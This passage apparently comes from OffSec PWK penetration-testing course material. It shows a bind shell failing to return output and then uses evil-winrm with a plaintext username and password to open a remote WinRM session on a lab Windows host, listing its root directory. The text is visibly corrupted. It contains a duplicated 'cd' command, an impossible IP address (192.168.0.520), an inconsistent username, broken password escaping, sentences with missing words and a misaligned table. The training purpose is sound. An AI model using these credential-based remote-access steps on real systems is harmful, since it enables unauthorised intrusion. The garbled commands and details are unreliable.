# OffSec

```
[CLIENTTWK220]: PS C:\Users\daveadmin\Documents> cd C:\ncd C:\
```

```
[CLIENTTWK220]: PS C:\Users\daveadmin\Documents> pwd
pwd
```

```
[CLIENTTWK220]: PS C:\Users\daveadmin\Documents> dir
dir
```

Listing 402 - No output from the commands we entered. 

Listing 402 that we received no output from the commands we entered. We should note that creating a PowerShell remote sending session WinRM in a bind shell we used in this example can cause unexpected behavior.

To avoid issues, use evil-winrm^778 to connect to CLIENTTWK220 via WinRM from our Kali machine. This tool provides built-in functions for penetration testing such as the hash, in-memory loading, and file upload/download. However, we will only use it to connect to the target system via WinRM to avoid the issues we faced by creating a PowerShell remote session in our bind shell shown in Listing 402.

We enter the IP as -i, the username for -u, and the password for -p. We need to escape quote" in the password.

```
kali@$: evil-winrm -i 192.168.0.520 -u dave-admin -p "qwertqwertqert123\!\"
```

Evil-WinRM shell v3.3

Warning: Remote paths is disabled due to ruby limitation:
quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github:
https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

+   *Evil-WinRM* PS C:\Users\daveadmin\Documents> whoami
clientTWK220:daveadmin

+   *Evil-WinRM* PS C:\Users\daveadmin\Documents> cd C:\

```
Directory:\
```

| Mode | LastWriteTime | Length Name |
|---|---|---|
| d---- | 6/5/2021 | 5:10 AM | PerLogs |
| d---- | 7/20/2022 | 1:14 AM | Program Files |
| d---- | 6/5/2021 | 7:37 AM | Program Files (x86) |
| d---- | 7/4/2022 | 1:00 AM | tools |
| d---- | 6/23/2022 | 8:12 AM | Users |

> ^778 (Github, 2022), https://github.com/Hackplayers/evil-winrm

PWK - Copyright © 2023 OffSecs Limited. All rights reserved.